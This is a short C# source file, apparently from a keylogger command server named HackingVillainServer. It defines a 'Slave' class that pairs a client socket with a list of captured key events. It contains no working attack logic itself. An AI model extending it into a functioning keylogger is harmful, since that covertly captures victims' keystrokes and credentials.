using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Hook;
using System.Windows.Forms;
using AwesomeSockets.Domain.Sockets;
using AwesomeSockets.Sockets;

namespace HackingVillainServer
{
    public class Slave
    {
        public ISocket Socket;
        public List<string> KeyEvents;

        public Slave(ISocket sock)
        {
            Socket = sock;
            this.KeyEvents = new List<string>();
        }
    }
}
